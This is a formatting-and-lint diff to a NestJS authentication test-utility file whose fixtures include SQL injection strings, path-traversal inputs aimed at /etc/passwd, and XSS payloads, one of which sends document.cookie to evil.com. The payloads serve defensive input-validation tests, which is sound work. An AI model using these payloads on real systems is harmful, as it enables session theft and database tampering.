@@ -3,17 +3,12 @@ import { JwtService } from '@nestjs/jwt';
 import { ConfigService } from '@nestjs/config';
 import { faker } from '@faker-js/faker';
 import { JwtPayload, TokenPair } from '@modules/auth/domain/auth.types';
-import { Password } from '@modules/auth/domain/value-objects/password.value-object';
-import { UserEntity } from '@modules/user/domain/entities/user.entity';
-import { RefreshTokenEntity } from '@modules/auth/domain/entities/refresh-token.entity';
-import { AuthAuditLogEntity } from '@modules/auth/domain/entities/auth-audit-log.entity';
 
 /**
  * Utility class for authentication testing
  * Provides helper methods, mock data, and test fixtures
  */
 export class AuthTestUtils {
-  
   /**
    * Generate a mock user for testing
    */
@@ -31,7 +26,7 @@ export class AuthTestUtils {
       permissions: ['user:read-own'],
       createdAt: new Date(),
       updatedAt: new Date(),
-      getProps: function() {
+      getProps: function () {
         return {
           email: this.email,
           password: this.password,
@@ -50,7 +45,9 @@ export class AuthTestUtils {
   /**
    * Generate a mock JWT payload
    */
-  static generateMockJwtPayload(overrides: Partial<JwtPayload> = {}): JwtPayload {
+  static generateMockJwtPayload(
+    overrides: Partial<JwtPayload> = {},
+  ): JwtPayload {
     const now = Math.floor(Date.now() / 1000);
     return {
       sub: faker.datatype.uuid(),
@@ -81,11 +78,15 @@ export class AuthTestUtils {
    * Generate a mock JWT token string
    */
   static generateMockJwtToken(payload?: Partial<JwtPayload>): string {
-    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64');
+    const header = Buffer.from(
+      JSON.stringify({ alg: 'HS256', typ: 'JWT' }),
+    ).toString('base64');
     const mockPayload = this.generateMockJwtPayload(payload);
-    const payloadBase64 = Buffer.from(JSON.stringify(mockPayload)).toString('base64');
+    const payloadBase64 = Buffer.from(JSON.stringify(mockPayload)).toString(
+      'base64',
+    );
     const signature = faker.datatype.hexadecimal({ length: 64 });
-    
+
     return `${header}.${payloadBase64}.${signature}`;
   }
 
@@ -165,7 +166,7 @@ export class AuthTestUtils {
       userAgent: faker.internet.userAgent(),
       success: true,
       createdAt: new Date(),
-      getProps: function() {
+      getProps: function () {
         return {
           userId: this.userId,
           action: this.action,
@@ -182,7 +183,9 @@ export class AuthTestUtils {
   /**
    * Create a mock testing module with authentication services
    */
-  static async createAuthTestingModule(overrides: any = {}): Promise<TestingModule> {
+  static async createAuthTestingModule(
+    overrides: any = {},
+  ): Promise<TestingModule> {
     return Test.createTestingModule({
       providers: [
         {
@@ -217,7 +220,7 @@ export class AuthTestUtils {
             }),
           },
         },
-        ...overrides.providers || [],
+        ...(overrides.providers || []),
       ],
       ...overrides,
     }).compile();
@@ -239,7 +242,7 @@ export class AuthTestUtils {
       "1' AND 1=1 --",
       "1' WAITFOR DELAY '00:00:10'--",
       "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
-      "' OR EXISTS(SELECT * FROM users WHERE email='admin@example.com'); --"
+      "' OR EXISTS(SELECT * FROM users WHERE email='admin@example.com'); --",
     ];
   }
 
@@ -259,7 +262,7 @@ export class AuthTestUtils {
       '<div style="background: url(javascript:alert(\'XSS\'))">',
       '"><script>alert("XSS")</script>',
       '<script>document.location="http://evil.com"</script>',
-      '<img src="x" onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">'
+      '<img src="x" onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">',
     ];
   }
 
@@ -277,25 +280,27 @@ export class AuthTestUtils {
       '..%252f..%252f..%252fetc%252fpasswd',
       '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
       '..%5c..%5c..%5cwindows%5csystem32%5c',
-      '/var/log/../../../etc/passwd'
+      '/var/log/../../../etc/passwd',
     ];
   }
 
   /**
    * Generate test data for rate limiting scenarios
    */
-  static generateRateLimitTestData(requestCount: number = 10): Array<{ ip: string; timestamp: number }> {
+  static generateRateLimitTestData(
+    requestCount: number = 10,
+  ): Array<{ ip: string; timestamp: number }> {
     const baseTime = Date.now();
     return Array.from({ length: requestCount }, (_, i) => ({
       ip: faker.internet.ip(),
-      timestamp: baseTime + (i * 1000), // 1 second apart
+      timestamp: baseTime + i * 1000, // 1 second apart
     }));
   }
 
   /**
    * Mock repository methods for authentication testing
    */
-  static getMockRepositoryMethods() {
+  static getMockRepositoryMethods(): any {
     return {
       findByEmail: jest.fn(),
       findOneById: jest.fn(),
@@ -316,7 +321,7 @@ export class AuthTestUtils {
   /**
    * Mock service methods for authentication testing
    */
-  static getMockServiceMethods() {
+  static getMockServiceMethods(): any {
     return {
       // JWT Service
       generateTokenPair: jest.fn(),
@@ -392,13 +397,23 @@ export class AuthTestUtils {
       this.generateMockUser({
         email: 'admin@example.com',
         roles: ['admin', 'user'],
-        permissions: ['admin:manage', 'user:read-all', 'user:update-all', 'user:delete'],
+        permissions: [
+          'admin:manage',
+          'user:read-all',
+          'user:update-all',
+          'user:delete',
+        ],
       }),
       // Editor user
       this.generateMockUser({
         email: 'editor@example.com',
         roles: ['editor', 'user'],
-        permissions: ['content:create', 'content:update', 'content:read', 'user:read-own'],
+        permissions: [
+          'content:create',
+          'content:update',
+          'content:read',
+          'user:read-own',
+        ],
       }),
       // Moderator user
       this.generateMockUser({
@@ -435,7 +450,7 @@ export class AuthTestUtils {
    * Performance test helper - measure execution time
    */
   static async measureExecutionTime<T>(
-    operation: () => Promise<T>
+    operation: () => Promise<T>,
   ): Promise<{ result: T; duration: number }> {
     const start = performance.now();
     const result = await operation();
@@ -449,25 +464,27 @@ export class AuthTestUtils {
   static async generateLoad(
     operation: () => Promise<any>,
     concurrency: number,
-    iterations: number
+    iterations: number,
   ): Promise<{ results: any[]; totalTime: number; successRate: number }> {
     const start = performance.now();
-    
+
     const batches = [];
     for (let i = 0; i < iterations; i += concurrency) {
       const batchSize = Math.min(concurrency, iterations - i);
-      const batch = Array(batchSize).fill(0).map(() => operation());
+      const batch = Array(batchSize)
+        .fill(0)
+        .map(() => operation());
       batches.push(Promise.all(batch));
     }
-    
+
     const allResults = await Promise.all(batches);
     const flatResults = allResults.flat();
     const end = performance.now();
-    
-    const successCount = flatResults.filter(result => 
-      result && (result.status === 200 || result.success === true)
+
+    const successCount = flatResults.filter(
+      (result) => result && (result.status === 200 || result.success === true),
     ).length;
-    
+
     return {
       results: flatResults,
       totalTime: end - start,
@@ -478,7 +495,10 @@ export class AuthTestUtils {
   /**
    * Security test helper - validate no sensitive data in logs
    */
-  static validateLogSecurity(logEntries: any[]): { isSecure: boolean; violations: string[] } {
+  static validateLogSecurity(logEntries: any[]): {
+    isSecure: boolean;
+    violations: string[];
+  } {
     const sensitivePatterns = [
       /password/i,
       /secret/i,
@@ -493,9 +513,11 @@ export class AuthTestUtils {
 
     logEntries.forEach((entry, index) => {
       const logString = JSON.stringify(entry);
-      sensitivePatterns.forEach(pattern => {
+      sensitivePatterns.forEach((pattern) => {
         if (pattern.test(logString)) {
-          violations.push(`Log entry ${index} contains sensitive data matching ${pattern}`);
+          violations.push(
+            `Log entry ${index} contains sensitive data matching ${pattern}`,
+          );
         }
       });
     });
@@ -509,7 +531,7 @@ export class AuthTestUtils {
   /**
    * Create test database transaction helper
    */
-  static createMockDatabaseTransaction() {
+  static createMockDatabaseTransaction(): any {
     return {
       query: jest.fn(),
       transaction: jest.fn(),
@@ -523,7 +545,9 @@ export class AuthTestUtils {
   /**
    * Generate mock environment configuration for tests
    */
-  static getMockEnvironmentConfig(overrides: Record<string, any> = {}): Record<string, any> {
+  static getMockEnvironmentConfig(
+    overrides: Record<string, any> = {},
+  ): Record<string, any> {
     return {
       NODE_ENV: 'test',
       JWT_ACCESS_TOKEN_SECRET: 'test-access-secret-key-that-is-long-enough',
@@ -556,14 +580,17 @@ export class AuthTestUtils {
  * Test data factory for creating consistent test scenarios
  */
 export class AuthTestDataFactory {
-  
   /**
    * Create a complete authentication test scenario
    */
-  static createAuthScenario(scenarioType: 'success' | 'failure' | 'edge-case' = 'success') {
+  static createAuthScenario(
+    scenarioType: 'success' | 'failure' | 'edge-case' = 'success',
+  ): any {
     const baseUser = AuthTestUtils.generateMockUser();
-    const baseLogin = AuthTestUtils.generateValidLoginData({ email: baseUser.email });
-    
+    const baseLogin = AuthTestUtils.generateValidLoginData({
+      email: baseUser.email,
+    });
+
     switch (scenarioType) {
       case 'success':
         return {
@@ -575,10 +602,10 @@ export class AuthTestDataFactory {
             refreshToken: expect.any(String),
           }),
         };
-        
+
       case 'failure':
         return {
-          user: AuthTestUtils.generateMockUser({ 
+          user: AuthTestUtils.generateMockUser({
             isActive: false,
             loginAttempts: 5,
             lockedUntil: new Date(Date.now() + 30 * 60 * 1000),
@@ -587,10 +614,10 @@ export class AuthTestDataFactory {
           expectedResult: 'failure',
           expectation: expect.any(Error),
         };
-        
+
       case 'edge-case':
         return {
-          user: AuthTestUtils.generateMockUser({ 
+          user: AuthTestUtils.generateMockUser({
             email: 'test+tag@example.com',
             password: null,
           }),
@@ -601,7 +628,7 @@ export class AuthTestDataFactory {
           expectedResult: 'edge-case',
           expectation: expect.any(Error),
         };
-        
+
       default:
         throw new Error(`Unknown scenario type: ${scenarioType}`);
     }
@@ -610,7 +637,7 @@ export class AuthTestDataFactory {
   /**
    * Create security test scenarios
    */
-  static createSecurityScenarios() {
+  static createSecurityScenarios(): any {
     return {
       sqlInjection: {
         inputs: AuthTestUtils.getSqlInjectionPatterns(),
@@ -630,7 +657,7 @@ export class AuthTestDataFactory {
   /**
    * Create performance test scenarios
    */
-  static createPerformanceScenarios() {
+  static createPerformanceScenarios(): any {
     return {
       lowLoad: { concurrency: 10, iterations: 100 },
       mediumLoad: { concurrency: 50, iterations: 500 },
@@ -647,10 +674,10 @@ export const customMatchers = {
   /**
    * Check if a JWT token is valid format
    */
-  toBeValidJwtToken(received: string) {
+  toBeValidJwtToken(received: string): any {
     const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/;
     const pass = jwtRegex.test(received);
-    
+
     if (pass) {
       return {
         message: () => `expected ${received} not to be a valid JWT token`,
@@ -667,21 +694,23 @@ export const customMatchers = {
   /**
    * Check if response contains no sensitive information
    */
-  toNotContainSensitiveData(received: any) {
+  toNotContainSensitiveData(received: unknown): any {
     const sensitiveFields = ['password', 'secret', 'key', 'hash', 'salt'];
     const receivedString = JSON.stringify(received);
-    
+
     for (const field of sensitiveFields) {
       if (receivedString.toLowerCase().includes(field.toLowerCase())) {
         return {
-          message: () => `expected response not to contain sensitive field '${field}'`,
+          message: () =>
+            `expected response not to contain sensitive field '${field}'`,
           pass: false,
         };
       }
     }
-    
+
     return {
-      message: () => `expected response to contain sensitive data but it doesn't`,
+      message: () =>
+        `expected response to contain sensitive data but it doesn't`,
       pass: true,
     };
   },
@@ -689,7 +718,7 @@ export const customMatchers = {
   /**
    * Check if error message is user-safe
    */
-  toBeUserSafeError(received: Error) {
+  toBeUserSafeError(received: Error): any {
     const dangerousPatterns = [
       /stack trace/i,
       /internal server/i,
@@ -698,9 +727,9 @@ export const customMatchers = {
       /file not found/i,
       /permission denied/i,
     ];
-    
+
     const message = received.message;
-    
+
     for (const pattern of dangerousPatterns) {
       if (pattern.test(message)) {
         return {
@@ -709,7 +738,7 @@ export const customMatchers = {
         };
       }
     }
-    
+
     return {
       message: () => `expected error message '${message}' not to be user-safe`,
       pass: true,
@@ -719,6 +748,7 @@ export const customMatchers = {
 
 // Extend Jest matchers
 declare global {
+  // eslint-disable-next-line @typescript-eslint/no-namespace
   namespace jest {
     interface Matchers<R> {
       toBeValidJwtToken(): R;
